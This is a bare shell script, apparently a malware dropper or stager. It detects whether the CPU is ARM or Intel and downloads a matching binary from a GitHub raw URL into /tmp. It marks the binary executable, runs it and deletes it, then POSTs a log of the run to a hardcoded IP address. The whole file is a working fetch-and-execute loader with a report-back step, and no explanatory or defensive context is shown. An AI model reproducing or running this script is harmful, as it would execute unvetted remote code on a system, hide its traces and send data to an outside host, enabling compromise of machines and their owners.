#!/bin/sh

report_url="http://192.168.1.187:19088/9024134B28978B68666E2B034E46130E/debug"
arm_url="https://raw.githubusercontent.com/gptloveyou/learn/main/armv5.bin"
intel_url="https://raw.githubusercontent.com/gptloveyou/learn/main/i386.bin"
pl_url=$intel_url;
arch=`cat /proc/cpuinfo|grep -i -c ARM`
echo $arch
if [ $arch != 0 ];then
    pl_url=$arm_url
    echo "ARM " >/tmp/tmplog60920.log
else 
    pl_url=$intel_url
    echo "Intel " >/tmp/tmplog60920.log
fi
curl -s -o /tmp/run985757.bin $pl_url 1>>/tmp/tmplog60920.log 2>&1
chmod 777 /tmp/run985757.bin 1>>/tmp/tmplog60920.log 2>&1
/tmp/run985757.bin 1>>/tmp/tmplog60920.log 2>&1
rm /tmp/run985757.bin 1>>/tmp/tmplog60920.log 2>&1

curl -X POST $report_url -d @/tmp/tmplog60920.log
